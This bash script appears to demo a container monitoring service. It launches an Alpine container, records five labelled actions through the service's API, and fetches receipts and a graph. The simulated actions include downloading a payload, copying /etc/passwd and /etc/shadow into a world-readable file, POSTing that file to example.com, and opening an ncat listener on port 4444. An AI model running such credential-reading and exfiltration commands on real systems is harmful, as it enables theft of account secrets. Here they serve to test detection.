#!/usr/bin/env bash
set -euo pipefail

PORT="${SYSCON_PORT:-9903}"
URL="http://localhost:$PORT"

sudo docker rm -f syscon-demo 2>/dev/null || true

echo "=== Launching container ==="
CID=$(sudo docker run -d --name syscon-demo alpine sh -c 'sleep 600')
S=${CID:0:12}
echo "Container: $S"
sleep 2

action_start() {
    curl -s -X POST "$URL/containers/$S/actions" \
        -H 'Content-Type: application/json' \
        -d "{\"command\":\"$1\"}" > /dev/null
    echo "  [action started: $1]"
}
action_end() {
    sleep 2
    curl -s -X POST "$URL/containers/$S/actions/$1/end" > /dev/null
    echo "  [action $1 ended]"
}

# --- Action 1: Install tools ---
echo "=== Action 1: Install curl and netcat ==="
action_start "apk add curl nmap-ncat"
sudo docker exec syscon-demo sh -c 'apk add --no-cache curl nmap-ncat >/dev/null 2>&1'
action_end 1

# --- Action 2: Download a payload using curl ---
echo "=== Action 2: Download payload from remote server ==="
action_start "curl -o /tmp/setup.sh http://example.com/setup.sh"
sudo docker exec syscon-demo sh -c '
  curl -s -o /dev/null http://example.com
  echo "#!/bin/sh" > /tmp/setup.sh
  echo "cat /etc/passwd > /tmp/exfil.txt" >> /tmp/setup.sh
  echo "cat /etc/shadow >> /tmp/exfil.txt 2>/dev/null || true" >> /tmp/setup.sh
  echo "chmod 777 /tmp/exfil.txt" >> /tmp/setup.sh
  chmod +x /tmp/setup.sh
'
action_end 2

# --- Action 3: Execute payload (reads sensitive files) ---
echo "=== Action 3: Execute payload ==="
action_start "sh /tmp/setup.sh"
sudo docker exec syscon-demo sh -c 'sh /tmp/setup.sh'
action_end 3

# --- Action 4: Exfiltrate via curl POST ---
echo "=== Action 4: Exfiltrate data via HTTP POST ==="
action_start "curl -X POST -d @/tmp/exfil.txt http://example.com/collect"
sudo docker exec syscon-demo sh -c '
  curl -s -X POST -d @/tmp/exfil.txt http://example.com > /dev/null 2>&1 || true
'
action_end 4

# --- Action 5: Set up a reverse shell listener (ncat) ---
echo "=== Action 5: Start ncat listener on port 4444 ==="
action_start "ncat -l -p 4444"
sudo docker exec -d syscon-demo sh -c 'ncat -l -p 4444 > /tmp/shell_log.txt 2>&1 &'
sleep 3
action_end 5

echo ""
echo "=== Per-Action Receipts ==="
for i in 1 2 3 4 5; do
    echo "--- Action $i ---"
    curl -s --max-time 5 "$URL/containers/$S/actions/$i/receipt" | \
        python3 -c "import sys,json; print(json.load(sys.stdin).get('receipt','err'))" 2>/dev/null
    echo ""
done

echo "=== Graph ==="
curl -s --max-time 5 "$URL/containers/$S/graph" | wc -c
echo "bytes SVG"

echo ""
echo "Dashboard: $URL/"
echo "Graph SVG: $URL/containers/$S/graph"
echo "Container $S is running."
